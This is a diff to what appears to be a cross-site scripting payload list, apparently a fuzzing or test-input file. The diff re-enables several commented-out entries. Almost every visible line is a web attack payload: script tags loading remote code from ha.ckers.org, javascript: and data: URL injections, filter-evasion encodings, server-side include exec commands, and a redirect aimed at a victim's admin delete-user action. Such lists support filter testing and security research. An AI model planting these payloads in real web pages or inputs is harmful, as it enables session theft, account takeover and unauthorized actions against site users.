@@ -681,7 +681,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
 alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-##'';!--"<XSS>=&{()}
+'';!--"<XSS>=&{()}
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
@@ -723,7 +723,7 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 <IMG SRC="livescript:[code]">
 <BODY ONLOAD=alert('XSS')>
 <BGSOUND SRC="javascript:alert('XSS');">
-##<BR SIZE="&{alert('XSS')}">
+<BR SIZE="&{alert('XSS')}">
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
 <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
@@ -738,7 +738,7 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
 <XSS STYLE="xss:expression(alert('XSS'))">
 <XSS STYLE="behavior: url(xss.htc);">
-##¼script¾alert(¢XSS¢)¼/script¾
+¼script¾alert(¢XSS¢)¼/script¾
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
@@ -758,7 +758,7 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 <? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
 <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
-##Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
  <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
@@ -768,7 +768,7 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-##<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://66.102.7.147/">XSS</A>
 <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
 <A HREF="http://1113982867/">XSS</A>
 <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
